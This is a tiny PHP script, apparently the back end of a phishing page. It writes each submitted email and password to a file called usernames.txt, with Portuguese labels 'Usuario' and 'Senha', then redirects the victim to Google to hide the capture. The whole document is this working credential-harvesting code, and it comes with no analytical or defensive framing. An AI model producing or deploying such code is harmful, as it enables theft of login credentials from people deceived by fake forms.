<?php
file_put_contents("usernames.txt", "Usuario: " . $_POST['email'] . " Senha: " . $_POST['password'] . "
", FILE_APPEND);
header('Location: https://www.google.com');
exit();